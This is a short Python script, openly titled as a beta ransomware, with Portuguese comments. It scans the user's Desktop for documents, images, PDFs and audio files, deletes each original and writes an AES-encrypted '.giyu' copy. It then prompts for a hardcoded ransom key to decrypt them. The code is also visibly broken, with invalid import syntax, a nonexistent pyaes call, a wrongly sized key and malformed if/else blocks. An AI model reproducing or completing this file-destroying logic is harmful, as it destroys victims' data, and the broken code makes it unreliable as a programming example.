"""
Ransoware Beta V1

By:Giyu Tomioka

0.0.0.0

"""

import glob
import os 
import time
import pyaes
from pathlib from path
"""
as bibliotecas ultilizadas foram por motivos:

os: mexe com sistema operacional
glob: procurar os arquivos
time: dar um tempo
pyaes: criptografar os arquivos
path: caminhos 
"""

arquivos = ["*.png", "*.doc", "*.pdf", "*.jpng", "*.mp3", "*.bat"]

#o print para verificar e o time para dar um tempo de 4 segundos para fazer o resto do codigo
print('criptografando')
time.sleep(4)

try:
    desktop = Path.home() / ("Desktop")
    downloads = Path.home() / ("Downloads")
except Exception:
    pass

os.chdir(desktop)

def criptografando():
    for files in arquivos:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_file}')
            key = b"batataquente15"
            aes = pyaes.AESModesOfOperation(key)
            crypto_data = aes.encrypt(file_data)

            novo_arquivo = format_file + (".giyu")
            novo_arquivo = open(f'{desktop}\\{novo_arquivo}', 'wb')
            novo_arquivo.write(crypto_data)
            novo_arquivo.close()


def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.giyu'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + ('.') + format_file[1]

            dnew_file = open(f'{desktop}\\{new_file_name}','wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
            
    except ValueError as err:
        print('chave invalida')



if __name__ == '__main__':
    criptografando()
    if criptografando:
        key = input('Seu computador foi criptografado, coloque a chave para descriptografar: ')
        if key == ("batataquente15")
        descrypt(key)
        for del_file in glob.glob('*.giyu'):
            os.remove(f'{desktop}\\{del_file}')

            else:
                print('descriptografando......')


















